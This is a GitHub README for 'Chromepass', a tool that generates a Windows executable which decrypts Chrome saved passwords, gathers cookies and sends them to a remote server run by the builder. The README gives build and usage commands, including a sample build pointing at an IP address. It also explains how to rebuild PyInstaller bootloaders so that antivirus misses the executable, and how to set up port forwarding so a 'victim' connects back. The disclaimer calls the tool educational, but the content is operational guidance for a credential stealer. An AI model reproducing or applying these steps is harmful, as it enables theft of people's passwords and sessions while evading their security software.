<h1 align='center'>Chromepass - Hacking Chrome Saved Passwords and Cookies</h1>
<p align="center">	
    <img src="https://img.shields.io/badge/Platform-Windows-green" />
	<a href="https://github.com/darkarp/chromepass/releases/latest">
	<img src="https://img.shields.io/github/v/release/darkarp/chromepass" alt="Release" />
	</a>
  <a href="https://travis-ci.org/darkarp/chrome-password-hacking">
    <img src="https://img.shields.io/badge/build-passing-green" alt="Build Status on CircleCI" />
	</a>
    <img src="https://img.shields.io/maintenance/yes/2021" />
	</br>
  
  <a href="https://github.com/darkarp/chromepass/commits/master">
    <img src="https://img.shields.io/github/last-commit/darkarp/chromepass" />
  </a>
  <img alt="Scrutinizer code quality (GitHub/Bitbucket)" src="https://img.shields.io/scrutinizer/quality/g/darkarp/chromepass?style=flat">
  <a href="https://github.com/darkarp/chromepass/blob/master/LICENSE">
    <img src="http://img.shields.io/github/license/darkarp/chromepass" />
  </a>
  </br>
  <a href="https://github.com/darkarp/chromepass/issues?q=is%3Aopen+is%3Aissue">
	<img alt="GitHub issues" src="https://img.shields.io/github/issues/darkarp/chromepass">
</a
<a href="https://github.com/darkarp/chromepass/issues?q=is%3Aissue+is%3Aclosed">
	<img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/darkarp/chromepass">
</a>
</br>
  <a href="https://discord.gg/beczNYP">
    <img src="https://img.shields.io/badge/discord-join-7289DA.svg?logo=discord&longCache=true&style=flat" />
  </a>
  </br>
    <a href="https://i.imgur.com/WtaFA6c.gif" target="_blank">View Demo</a>
    ·
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=bug_report.md&title=">Report Bug</a>
    ·
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=feature_request.md&title=">Request Feature</a>
  </p>  
  
  
<!-- TABLE OF CONTENTS -->
## Table of Contents

* [About the Project](#about-the-project)  
	* [AV Detection](#av-detection)
* [Getting started](#getting-started)
  * [Prerequisites](#dependencies-and-requirements)
  * [Installation](#installation)
* [Usage](#usage)
* [Todo](#todo)
* [Errors, Bugs and Feature Requests](#errors-bugs-and-feature-requests)
* [Learn More](#learn-more)
* [License](#license)
---
## About The project
Chromepass is a python-based console application that generates a windows executable with the following features:

  - Decrypt Chrome saved paswords
  - Send a file with the login/password combinations and cookies remotely (http server)
  - Undetectable by AV if done correctly
  - Custom icon
  - Custom error message

---

### AV Detection!
This can be undetected with a very easy step detailed below. The reason why it's detected is because many AVs get tripped by the popular signatures of pyinstaller. To mitigate this, you can build the bootloaders manually. You can do this on a clean VM if you wish:
 - Go through the [Installation](#installation) first
 - Open an administrator powershell
 - Run the following code and wait for it to finish, it might take a while: 
```powershell
Set-ExecutionPolicy remotesigned -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')); choco install -y python vcbuildtools git
```
 - Close the powershell window and open a new one as administrator again.
 - Go into the chromepass directory, if you're not in it already.
 - Run the following code: 
  ```powershell
     git clone https://github.com/pyinstaller/pyinstaller.git
     pip uninstall pyinstaller -y
     cd pyinstaller/bootloader
     python waf all
     cd ..
     pip install .
  ```
 - Now you can follow the [Usage](#usage) normally and your executable is no longer detected by most AVs. There are some additional things you can do to make it completely undetectable. I'll leave you to discover what some of those things are.  
 ---
## Getting started

### Dependencies and Requirements

This is a very simple application, which uses only:

* [Python] - Tested on python 3.6+

### Installation

Chromepass requires Windows to run! Support for linux and MacOS may be added soon

Clone the repository:
```powershell
git clone https://github.com/darkarp/chromepass
```

Install the dependencies:

```powershell
cd chromepass
pip install -r requirements.txt
```

If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+
If the errors persist, try:
```powershell
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```  

---

## Usage

Chromepass is very straightforward. Start by running:
```powershell
> python create.py -h
```
A list of options will appear and are self explanatory.

Running without any parameters will build the server and the client connecting to `127.0.0.1`. 

A simple example of a build:
```powershell
python create.py --ip 92.34.11.220 --error --message "An Error has happened"
```

After creating the server and the client, make sure you're running the server when the client is ran.

The cookies and passwords will be saved in `json` files on a new folder called `data` in the same directory as the server, separated by ip address.

If you'd like additional notes on evading AV, refer to [AV Detection](#av-detection)  

### Remote Notes
>If you'd like to use this in a remote scenario, you must also perform port forwarding (port 80), so that when the victim runs the client it is able to connect to the server on port 80.  
For more general information, click [here](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/). If you're still not satisfied, perform a google search.

---
 
## Errors, Bugs and feature requests

If you find an error or a bug, please report it as an issue.
If you wish to suggest a feature or an improvement please report it in the issue pages.

Please follow the templates shown when creating the issue.  

---

## Learn More

For access to a community full of aspiring computer security experts, ranging from the complete beginner to the seasoned veteran,
join our Discord Server: [WhiteHat Hacking](https://discord.gg/beczNYP)

If you wish to contact me, you can do so via: `mario@whitehathacking.tech` 

---

## Disclaimer
I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.

## License
<a href="https://github.com/darkarp/chromepass/blob/master/LICENSE"> MIT </a>
   
[Python]: <https://www.python.org/downloads/>
